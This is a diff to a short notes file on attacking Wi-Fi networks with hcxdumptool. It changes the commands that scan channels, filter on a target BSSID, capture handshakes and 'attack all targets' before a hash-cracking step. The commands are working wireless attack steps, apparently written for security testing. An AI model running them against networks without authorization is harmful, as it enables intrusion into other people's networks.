@@ -16,7 +16,7 @@ Tools:
     nmcli device set $wlif managed no
 
 - scan and show radio channel assignment to identify target
-    hcxdumptool -i $wlif -F --rcascan=active
+    hcxdumptool -i $wlif -F --rcascan=active --rds=3
 
 ## Capture packets and attack
 
@@ -26,10 +26,10 @@ Warning: hcxdumptool will perform active attacks by default
     bssid=aabbccddeeff
     channel=6a
     hcxdumptool --bpfc="wlan addr1 $bssid or wlan addr2 $bssid or wlan addr3 $bssid" > hcxfilter_$bssid.bpf
-    hcxdumptool -i $wlif --bpf=hcxfilter_$bssid.bpf -c $channel -w hcxdump_$bssid.pcapng
+    hcxdumptool -i $wlif --bpf=hcxfilter_$bssid.bpf -c $channel -w hcxdump_$bssid.pcapng --rds=3
 
 - attack all targets
-    hcxdumptool -i $wlif --rds=1 -F -w hcxdump.pcapng
+    hcxdumptool -i $wlif -F --rds=3 -w hcxdump.pcapng
 
 ## Crack hashes
 
